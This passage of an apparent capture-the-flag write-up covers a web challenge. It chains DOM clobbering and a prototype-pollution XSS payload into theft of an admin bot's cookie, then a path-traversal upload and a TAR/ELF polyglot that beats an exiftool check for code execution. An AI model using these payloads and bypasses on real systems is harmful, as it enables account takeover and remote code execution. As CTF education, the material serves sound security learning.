</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>          <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">endTime</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> Date();
</span></span><span style="display:flex;"><span>          <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">timeElapsed</span> <span style="color:#f92672">=</span> eval(
</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">`(</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">endTime</span>.<span style="color:#a6e22e">getTime</span>()<span style="color:#e6db74">}</span><span style="color:#e6db74"> - </span><span style="color:#e6db74">${</span><span style="color:#a6e22e">startTime</span>.<span style="color:#a6e22e">getTime</span>()<span style="color:#e6db74">}</span><span style="color:#e6db74">) / 1000`</span>
</span></span><span style="display:flex;"><span>          );
</span></span><span style="display:flex;"><span>          <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">timeSeconds</span> <span style="color:#f92672">=</span> eval(<span style="color:#e6db74">`</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">timeElapsed</span><span style="color:#e6db74">}</span><span style="color:#e6db74"> / 60`</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>          <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">element</span> <span style="color:#f92672">=</span> document.<span style="color:#a6e22e">createElement</span>(<span style="color:#e6db74">&#34;div&#34;</span>);
</span></span><span style="display:flex;"><span>          <span style="color:#a6e22e">element</span>.<span style="color:#a6e22e">innerHTML</span> <span style="color:#f92672">=</span> [
</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;start: &#34;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">startTime</span>,
</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;end: &#34;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">endTime</span>,
</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;timeElapsed: &#34;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">timeElapsed</span>,
</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;timeSeconds: &#34;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">timeSeconds</span>,
</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;Evaluated Config Size: &#34;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">evaluatedConfigSize</span>,
</span></span><span style="display:flex;"><span>          ].<span style="color:#a6e22e">toString</span>();
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>          document.<span style="color:#a6e22e">body</span>.<span style="color:#a6e22e">appendChild</span>(<span style="color:#a6e22e">element</span>);
</span></span><span style="display:flex;"><span>        });
</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">alert</span>(<span style="color:#a6e22e">error</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span><span style="color:#75715e">/* --- redacted --- */</span>
</span></span></code></pre></div><p>This Javascript piece has lots going on, but it&rsquo;s quite simple once we trace it step-by-step. I traced it in reverse, starting from the <code>eval</code> function which would give us client-side execution:</p>
<p>Take a deep breath, and let&rsquo;s say it in one go:</p>
<blockquote>
<p>To get XSS we need to control <code>configKeysLength</code> which is equal to <code>logData.config.length</code> which succeeds a deep merge between <code>logData</code> and <code>data</code> which is received from a call to the <code>/front_end_error/new/</code> at the <code>LOG_LEVEL.attributes.int.nodeValue</code> log level. All of this requires <code>window.UI_DEV_MODE</code> to be set and requires an error to be trigger in the wrapping <code>try</code> block.</p>
</blockquote>
<p>How can we achieve all of that? This took some time and experimentation, but let&rsquo;s do a forward pass through it</p>
<ol>
<li>First, we can trigger an error within the <code>try {}</code> block by clobbering <code>document.getElementById</code>. This can be achieved using <code>&lt;img name=getElementById&gt;</code> (Yea, I also didn&rsquo;t know)</li>
<li>Once within the <code>catch {}</code> block, we can satisfy the <code>if</code> condition by clobbering <code>window.UI_DEV_MODE</code>. This can be achieved using <code>&lt;a id=UI_DEV_MODE&gt;</code></li>
<li>Once we get to the <code>fetch</code>, we easily make it return our own user-controlled JSON payload by accessing our same-site read-write primitive found earlier at <code>/front_end_error/view/pollution</code>. This can be achieved via DOM clobbering to path traversal using <code>&lt;a id=LOG_LEVEL int='../view/pollution'&gt;</code></li>
<li>Once we are at <code>merge(logData, data)</code>, we can pollute the <code>.length</code> parameter with our final XSS by sending a JSON object like <code>{&quot;__proto__&quot;: {&quot;length&quot;: &quot;alert(document.origin)//&quot;}}</code></li>
</ol>
<p>Which looks like this:
<img src="/posts/novacore-a-never-ending-chain/xss_data_flow.png"></p>
<p>Essentially, once all constraints are in place, our XSS payload will be delivered via our read-write primitive found earlier.</p>
<p>Our payload can also use the same read-write primitive to exfiltrate the bot&rsquo;s admin non-HttpOnly cookie since the primitive is same-site. If this wasn&rsquo;t available, a simple <code>window.href</code> redirect is also valid exfiltration method since top-level navigations are not prone to CSP.</p>
<blockquote>
<p><em>Note: The final payload and how everything will be glued together is part of the last chapter where we automate this whole chain.</em></p>
</blockquote>
<p>With the admin cookie in hand, we will assume admin privileges from now on. Let&rsquo;s find our way to code execution.</p>
<h2 id="chapter-6-popping-calcexe-metaphorically">Chapter 6: Popping calc.exe (Metaphorically)<a href="#chapter-6-popping-calcexe-metaphorically" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
<p>An RCE is always made of two components:</p>
<ol>
<li>Write data</li>
<li>Execute data</li>
</ol>
<p>Let&rsquo;s see where we can find these two components within our newly-gained admin capabilities.</p>
<p>We quickly spot two fantastic candidates in <code>web.py</code>:</p>
<ol>
<li><code>@web.route(&quot;/upload_dataset&quot;, methods=[&quot;POST&quot;])</code></li>
<li><code>@web.route(&quot;/run_plugin&quot;, methods=[&quot;POST&quot;])</code></li>
</ol>
<p>The first route allows us to upload datasets to <code>/app/application/datasets</code> as <code>tar</code> archives :</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#a6e22e">@web.route</span>(<span style="color:#e6db74">&#34;/upload_dataset&#34;</span>, methods<span style="color:#f92672">=</span>[<span style="color:#e6db74">&#34;POST&#34;</span>])
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@login_required</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">upload_dataset</span>():
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#34;dataset_file&#34;</span> <span style="color:#f92672">not</span> <span style="color:#f92672">in</span> request<span style="color:#f92672">.</span>files:
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> render_template(
</span></span><span style="display:flex;"><span>			<span style="color:#e6db74">&#34;error.html&#34;</span>,
</span></span><span style="display:flex;"><span>			title<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Error&#34;</span>,
</span></span><span style="display:flex;"><span>			type<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Input&#34;</span>,
</span></span><span style="display:flex;"><span>			message<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;File not found&#34;</span>,
</span></span><span style="display:flex;"><span>			nav_enabled<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>,
</span></span><span style="display:flex;"><span>		), <span style="color:#ae81ff">403</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	file <span style="color:#f92672">=</span> request<span style="color:#f92672">.</span>files[<span style="color:#e6db74">&#34;dataset_file&#34;</span>]
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> check_dataset_filename(file<span style="color:#f92672">.</span>filename) <span style="color:#f92672">and</span> <span style="color:#f92672">not</span> is_tar_file(file<span style="color:#f92672">.</span>filename):
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> render_template(
</span></span><span style="display:flex;"><span>			<span style="color:#e6db74">&#34;error.html&#34;</span>,
</span></span><span style="display:flex;"><span>			title<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Error&#34;</span>,
</span></span><span style="display:flex;"><span>			type<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Input&#34;</span>,
</span></span><span style="display:flex;"><span>			message<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;File not valid&#34;</span>,
</span></span><span style="display:flex;"><span>			nav_enabled<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>,
</span></span><span style="display:flex;"><span>		), <span style="color:#ae81ff">403</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	tmp_file_path <span style="color:#f92672">=</span> str(uuid<span style="color:#f92672">.</span>uuid4()) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;.tar&#34;</span>
</span></span><span style="display:flex;"><span>	upload_path <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>join(<span style="color:#e6db74">&#34;/tmp&#34;</span>, tmp_file_path)
</span></span><span style="display:flex;"><span>	file<span style="color:#f92672">.</span>save(upload_path)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> is_tar_content(upload_path):
</span></span><span style="display:flex;"><span>		os<span style="color:#f92672">.</span>unlink(upload_path)
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> render_template(
</span></span><span style="display:flex;"><span>			<span style="color:#e6db74">&#34;error.html&#34;</span>,
</span></span><span style="display:flex;"><span>			title<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Error&#34;</span>,
</span></span><span style="display:flex;"><span>			type<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Input&#34;</span>,
</span></span><span style="display:flex;"><span>			message<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;File not valid&#34;</span>,
</span></span><span style="display:flex;"><span>			nav_enabled<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>,
</span></span><span style="display:flex;"><span>		), <span style="color:#ae81ff">403</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	new_upload_path <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>join(<span style="color:#e6db74">&#34;/app/application/datasets&#34;</span>, file<span style="color:#f92672">.</span>filename)
</span></span><span style="display:flex;"><span>	os<span style="color:#f92672">.</span>rename(upload_path, new_upload_path)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> redirect(<span style="color:#e6db74">&#34;/datasets&#34;</span>)
</span></span></code></pre></div><p>While the second allows us to execute any of our pre-compiled plugins found at <code>/app/application/plugins</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#a6e22e">@web.route</span>(<span style="color:#e6db74">&#34;/run_plugin&#34;</span>, methods<span style="color:#f92672">=</span>[<span style="color:#e6db74">&#34;POST&#34;</span>])
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@login_required</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">plugin_run</span>():
</span></span><span style="display:flex;"><span>	plugin_dir <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;/app/application/plugins&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	plugin <span style="color:#f92672">=</span> request<span style="color:#f92672">.</span>form<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;plugin&#34;</span>)
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> plugin:
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> render_template(
</span></span><span style="display:flex;"><span>			<span style="color:#e6db74">&#34;error.html&#34;</span>,
</span></span><span style="display:flex;"><span>			title<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Error&#34;</span>,
</span></span><span style="display:flex;"><span>			type<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Input&#34;</span>,
</span></span><span style="display:flex;"><span>			message<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Plugin is required&#34;</span>,
</span></span><span style="display:flex;"><span>			nav_enabled<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>,
</span></span><span style="display:flex;"><span>		), <span style="color:#ae81ff">403</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	plugin_path <span style="color:#f92672">=</span> plugin_dir <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;/&#34;</span> <span style="color:#f92672">+</span> plugin
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> check_plugin_filename(plugin) <span style="color:#f92672">or</span> <span style="color:#f92672">not</span> is_exe_file(plugin_path):
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> render_template(
</span></span><span style="display:flex;"><span>			<span style="color:#e6db74">&#34;error.html&#34;</span>,
</span></span><span style="display:flex;"><span>			title<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Error&#34;</span>,
</span></span><span style="display:flex;"><span>			type<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Input&#34;</span>,
</span></span><span style="display:flex;"><span>			message<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Invalid plugin&#34;</span>,
</span></span><span style="display:flex;"><span>			nav_enabled<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>,
</span></span><span style="display:flex;"><span>		), <span style="color:#ae81ff">403</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	plugin_results <span style="color:#f92672">=</span> run_plugin(plugin_path)
</span></span><span style="display:flex;"><span>	plugin_files <span style="color:#f92672">=</span> list_files_in_directory(plugin_dir)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	final_files <span style="color:#f92672">=</span> []
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">for</span> plugin <span style="color:#f92672">in</span> plugin_files:
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> is_exe_file(plugin_dir <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;/&#34;</span> <span style="color:#f92672">+</span> plugin):
</span></span><span style="display:flex;"><span>			final_files<span style="color:#f92672">.</span>append(plugin)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> render_template(<span style="color:#e6db74">&#34;plugins.html&#34;</span>, title<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Plugins&#34;</span>, session_data<span style="color:#f92672">=</span>session, plugin_files<span style="color:#f92672">=</span>final_files, plugin_results<span style="color:#f92672">=</span>plugin_results)
</span></span></code></pre></div><p>One writes to <code>/app/applications/datasets</code> while the other executes from <code>/app/applications/plugins</code>. An inconvenience, indeed.</p>
<p>Inspecting the dataset endpoint, we can see this operation performed at the end:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>new_upload_path <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>join(<span style="color:#e6db74">&#34;/app/application/datasets&#34;</span>, file<span style="color:#f92672">.</span>filename)
</span></span><span style="display:flex;"><span>os<span style="color:#f92672">.</span>rename(upload_path, new_upload_path)
</span></span></code></pre></div><p>This is unsafe as it trusts <code>file.filename</code>, passing it as a second argument to <code>os.path.join</code>.</p>
<p>However, <code>file.filename</code> itself gets validated earlier using <code>check_dataset_filename</code> and <code>is_tar_file</code> as follows:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>file <span style="color:#f92672">=</span> request<span style="color:#f92672">.</span>files[<span style="color:#e6db74">&#34;dataset_file&#34;</span>]
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> check_dataset_filename(file<span style="color:#f92672">.</span>filename) <span style="color:#f92672">and</span> <span style="color:#f92672">not</span> is_tar_file(file<span style="color:#f92672">.</span>filename):
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> render_template(
</span></span><span style="display:flex;"><span>			<span style="color:#e6db74">&#34;error.html&#34;</span>,
</span></span><span style="display:flex;"><span>			title<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Error&#34;</span>,
</span></span><span style="display:flex;"><span>			type<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Input&#34;</span>,
</span></span><span style="display:flex;"><span>			message<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;File not valid&#34;</span>,
</span></span><span style="display:flex;"><span>			nav_enabled<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>,
</span></span><span style="display:flex;"><span>		), <span style="color:#ae81ff">403</span>
</span></span></code></pre></div><p>The first function allows us to conveniently use dots and slashes in our file name:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">check_dataset_filename</span>(file_path):
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> re<span style="color:#f92672">.</span><span style="color:#66d9ef">match</span>(<span style="color:#e6db74">r</span><span style="color:#e6db74">&#34;^[a-zA-Z0-9./]+$&#34;</span>, file_path):
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> <span style="color:#66d9ef">True</span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> <span style="color:#66d9ef">False</span>
</span></span></code></pre></div><p>While the second function restricts us to a <code>.tar</code> ending:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">is_tar_file</span>(file_path):
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> file_path<span style="color:#f92672">.</span>lower()<span style="color:#f92672">.</span>endswith(<span style="color:#e6db74">&#34;.tar&#34;</span>)
</span></span></code></pre></div><p>That will do for us. It allows us to upload to any location by setting our uploaded filename to an absolute path with a <code>.tar</code> ending a la <code>/app/applications/plugins/aaaaaa.tar</code>.</p>
<p>What about the file&rsquo;s contents? Do we have any restrictions regarding those? Yes, we do:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> is_tar_content(upload_path):
</span></span><span style="display:flex;"><span>		os<span style="color:#f92672">.</span>unlink(upload_path)
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> render_template(
</span></span><span style="display:flex;"><span>			<span style="color:#e6db74">&#34;error.html&#34;</span>,
</span></span><span style="display:flex;"><span>			title<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Error&#34;</span>,
</span></span><span style="display:flex;"><span>			type<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Input&#34;</span>,
</span></span><span style="display:flex;"><span>			message<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;File not valid&#34;</span>,
</span></span><span style="display:flex;"><span>			nav_enabled<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>,
</span></span><span style="display:flex;"><span>		), <span style="color:#ae81ff">403</span>
</span></span></code></pre></div><p><code>is_tar_content</code> is defined in <code>general.py</code> as follows:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">is_tar_content</span>(file_path):
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">try</span>:
</span></span><span style="display:flex;"><span>		result <span style="color:#f92672">=</span> subprocess<span style="color:#f92672">.</span>run(
</span></span><span style="display:flex;"><span>			[<span style="color:#e6db74">&#34;exiftool&#34;</span>, file_path],
</span></span><span style="display:flex;"><span>			capture_output<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>,
</span></span><span style="display:flex;"><span>			text<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>,
</span></span><span style="display:flex;"><span>			check<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>
</span></span><span style="display:flex;"><span>		)
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">for</span> line <span style="color:#f92672">in</span> result<span style="color:#f92672">.</span>stdout<span style="color:#f92672">.</span>splitlines():
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#34;file type&#34;</span> <span style="color:#f92672">in</span> line<span style="color:#f92672">.</span>lower():
</span></span><span style="display:flex;"><span>				<span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;tar&#34;</span> <span style="color:#f92672">in</span> line<span style="color:#f92672">.</span>lower()
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> <span style="color:#66d9ef">False</span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">except</span> subprocess<span style="color:#f92672">.</span>CalledProcessError:
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> <span style="color:#66d9ef">False</span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">except</span> <span style="color:#a6e22e">FileNotFoundError</span>:
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> <span style="color:#66d9ef">False</span>
</span></span></code></pre></div><p>The function calls <code>exiftool</code> on the dataset file and confirms that at least one line of <code>exiftool</code>&rsquo;s output contains the phrases <code>file type</code> and <code>tar</code>.</p>
<p>We could bypass this in two ways, but both won&rsquo;t work for various reasons:</p>
<ol>
<li>A race condition where we execute the file quickly while it&rsquo;s on disk before <code>exiftool</code> returns its output This won&rsquo;t work because during the <code>exiftool</code> check <code>upload_dataset</code> keeps the uploaded file at a random location within <code>/tmp</code>.</li>
<li>Give the uploaded file a filename of <code>file type.tar</code> which would trivially bypass the <code>exiftool</code> check
<ul>
<li>This won&rsquo;t work because the file is given a <code>uuidv4</code> filename during the check + the <code>check_dataset_filename</code> prohibits spaces in filename.</li>
</ul>
</li>
</ol>
<p>Umm&hellip; What can we do then? This destroys our <code>calc.exe</code> dreams.</p>
<p>Our file must be a <code>tar</code> to be recognized by <code>exiftool</code> as <code>tar</code>. It also must be an executable, well, to be executed.</p>
<p>Enters, polyglot files. We can have a file contain characteristics of multiple types without compromising characteristics of another. There is a whole database of possible combinations:</p>
<ul>
<li><a href="https://github.com/Polydet/polyglot-database">https://github.com/Polydet/polyglot-database</a></li>
</ul>
<p>And an excellent low-level explanation of how this is even possible:</p>
<ul>
<li><a href="https://tmpout.sh/4/16.html">Polyglottar, a structured ISO+TAR+ELF polyglot by Enrique Soriano-Salvador</a></li>
</ul>
<p>Long story short, the TAR magic number is placed at offset 0x101. If we write the TAR magic number at that offset within an ELF, lets see&hellip;</p>
<p>We will compile a basic C program:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>echo <span style="color:#e6db74">&#39;main(){printf(&#34;hello, world\n&#34;);}&#39;</span> &gt; main.c
</span></span><span style="display:flex;"><span>gcc main.c -o main
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>./main
</span></span><span style="display:flex;"><span>hello, world
</span></span></code></pre></div><p>Let&rsquo;s check it&rsquo;s type:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ exiftool main
</span></span><span style="display:flex;"><span>ExifTool Version Number         : 12.40
</span></span><span style="display:flex;"><span>File Name                       : main
</span></span><span style="display:flex;"><span>Directory                       : .
</span></span><span style="display:flex;"><span>File Size                       : <span style="color:#ae81ff">16</span> KiB
</span></span><span style="display:flex;"><span>File Modification Date/Time     : 2025:05:29 05:14:08+04:00
</span></span><span style="display:flex;"><span>File Access Date/Time           : 2025:05:29 05:14:08+04:00
</span></span><span style="display:flex;"><span>File Inode Change Date/Time     : 2025:05:29 05:14:08+04:00
</span></span><span style="display:flex;"><span>File Permissions                : -rwxrwxrwx
</span></span><span style="display:flex;"><span>File Type                       : ELF shared library
</span></span><span style="display:flex;"><span>File Type Extension             : so
</span></span><span style="display:flex;"><span>MIME Type                       : application/octet-stream
</span></span><span style="display:flex;"><span>CPU Architecture                : <span style="color:#ae81ff">64</span> bit
</span></span><span style="display:flex;"><span>CPU Byte Order                  : Little endian
</span></span><span style="display:flex;"><span>Object File Type                : Shared object file
</span></span><span style="display:flex;"><span>CPU Type                        : AMD x86-64
</span></span></code></pre></div><p>Let&rsquo;s make a tiny modification at offset 0x101 (257):</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>printf <span style="color:#e6db74">&#39;ustar\0&#39;</span> | dd of<span style="color:#f92672">=</span>x bs<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span> seek<span style="color:#f92672">=</span><span style="color:#ae81ff">257</span> conv<span style="color:#f92672">=</span>notrunc
</span></span></code></pre></div><p>And check again:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>exiftool main
</span></span><span style="display:flex;"><span>ExifTool Version Number         : 12.40
</span></span><span style="display:flex;"><span>File Name                       : main
</span></span><span style="display:flex;"><span>Directory                       : .
</span></span><span style="display:flex;"><span>File Size                       : <span style="color:#ae81ff">16</span> KiB
</span></span><span style="display:flex;"><span>File Modification Date/Time     : 2025:05:29 05:14:44+04:00
</span></span><span style="display:flex;"><span>File Access Date/Time           : 2025:05:29 05:14:44+04:00
</span></span><span style="display:flex;"><span>File Inode Change Date/Time     : 2025:05:29 05:14:44+04:00
</span></span><span style="display:flex;"><span>File Permissions                : -rwxrwxrwx
</span></span><span style="display:flex;"><span>File Type                       : TAR
</span></span><span style="display:flex;"><span>File Type Extension             : tar
</span></span><span style="display:flex;"><span>MIME Type                       : application/x-tar
</span></span><span style="display:flex;"><span>Warning                         : Unsupported file type
</span></span></code></pre></div><p>Apart from the warning on the last line, <code>File Type</code> did change to <code>TAR</code>! But wait a second&hellip; can we still run the ELF?</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>./main
</span></span><span style="display:flex;"><span>hello, world
</span></span></code></pre></div><p>Incredible! It runs! We can now bypass all file upload restrictions, put a file anywhere we want, and bypass file content checks via a crafted polyglot TAR/ELF file that we can remotely execute on the target.</p>
<p>In the next - and final - chapter, we will be scripting everything we found so far into one neat chain that automatically generates everything from 0 to flag.</p>
<h2 id="chapter-7-scripting-time">Chapter 7: Scripting Time!<a href="#chapter-7-scripting-time" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
<p>Let&rsquo;s put everything we did so far together in one auto-flag python script.</p>
<p>We will build the script piece by piece, then showcase the complete script at the end.</p>
<p>Let&rsquo;s start by importing the modules we need:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> rich <span style="color:#f92672">import</span> print
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> subprocess
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> base64
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> httpx
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> time
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> re
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> io
</span></span></code></pre></div><p>Notably, we will use <code>subprocess</code> to automate compiling our custom plugin executable inside the target&rsquo;s Docker environment, <code>io</code> to craft our polyglot ELF, and of course <code>httpx</code> to communicate with our target.</p>
<p>We could avoid the Docker step by compiling a static executable, or by even doing it manually and copying the payload from Docker. I chose to automate it for fun factor.</p>
<p>First step is to get the Docker container which we are going to compile our plugin inside:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>container_id <span style="color:#f92672">=</span> subprocess<span style="color:#f92672">.</span>check_output(
